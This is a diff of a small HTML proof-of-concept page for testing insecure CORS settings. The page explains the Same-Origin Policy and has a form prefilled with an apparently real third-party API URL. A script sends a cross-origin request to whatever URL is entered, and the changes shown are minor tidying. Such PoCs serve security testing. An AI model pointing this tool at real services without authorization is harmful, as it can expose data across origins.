@@ -1,5 +1,5 @@
 <html>
-<head>Insecure CORS PoC</head>
+<head><h1>Insecure CORS PoC</h1></head>
 <body>
 <p>The Same-Origin Policy (SOP) is a fundamental browser security mechanism that restricts web pages from interacting with resources loaded from different origins. This prevents scripts from accessing or manipulating content from other sites, such as those in other browser tabs or windows.
 
@@ -9,11 +9,13 @@
 
 <form id="urlForm">
         <label for="urlInput">URL:</label>
-        <input type="text" id="urlInput" name="urlInput" value="https://breitlingpp-api-was.aitcentral.com/api/External/product/AB01766A1A1X1" required>
+        <input cols=200 type="text" id="urlInput" name="urlInput" value="https://breitlingpp-api-was.aitcentral.com/api/External/product/AB01766A1A1X1" required>
         <button type="submit">Submit</button>
 </form>
   
 <script>
+let url = '';
+  
 function cors() {
   var xhttp = new XMLHttpRequest();
   xhttp.onreadystatechange = function() {
@@ -30,7 +32,7 @@ function cors() {
 
 document.getElementById('urlForm').addEventListener('submit', function(event) {
   event.preventDefault();
-  const url = document.getElementById('urlInput').value;
+  url = document.getElementById('urlInput').value;
   console.log("URL entered:", url);
   cors();
 });
